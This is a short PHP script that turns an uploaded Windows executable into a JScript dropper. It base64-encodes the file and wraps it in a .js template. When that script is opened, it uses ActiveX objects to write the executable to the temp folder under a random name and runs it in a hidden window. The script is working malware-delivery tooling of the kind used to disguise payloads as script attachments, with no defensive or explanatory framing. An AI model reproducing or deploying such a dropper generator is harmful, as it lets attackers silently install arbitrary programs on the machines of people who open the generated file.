<?php

header('Content-Type: application/javascript');

header('Access-Control-Allow-Origin: *');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {

    die('Invalid request method');

}

if (!isset($_FILES['exeFile']) || $_FILES['exeFile']['error'] !== UPLOAD_ERR_OK) {

    die('File upload failed');

}

$exeFile = $_FILES['exeFile'];

$fileName = pathinfo($exeFile['name'], PATHINFO_FILENAME);

$maxSize = 50 * 1024 * 1024; 

$date = date('Y-m-d H:i:s');


if ($exeFile['size'] > $maxSize) {

    die('File too large. Max 50MB.');

}


$exeContent = file_get_contents($exeFile['tmp_name']);

$base64Data = base64_encode($exeContent);


$jsTemplate = <<<JS

// Generated from: {$exeFile['name']}

// File size: {$exeFile['size']} bytes

// Generation time: {$date}

var fso = new ActiveXObject('Scripting.FileSystemObject');

var tmp_path = fso.GetSpecialFolder(2) + '\\\\' + fso.GetTempName();

tmp_path = tmp_path.replace('.tmp', '.exe');

var stream = new ActiveXObject('ADODB.Stream');

stream.Open();

stream.Type = 1;

stream.Position = 0;

var xmlObj = new ActiveXObject('MSXml2.DOMDocument');

var docElement = xmlObj.createElement('Base64Data');

docElement.dataType = 'bin.base64';

docElement.text = "{$base64Data}";

stream.Write(docElement.nodeTypedValue);

stream.SaveToFile(tmp_path, 2);

stream.Close();

var shell = new ActiveXObject('WScript.Shell');

shell.run(tmp_path, 0);

// END 

JS;


header('Content-Disposition: attachment; filename="' . $fileName . '.js"');

header('Content-Length: ' . strlen($jsTemplate));

echo $jsTemplate;



unlink($exeFile['tmp_name']);

?>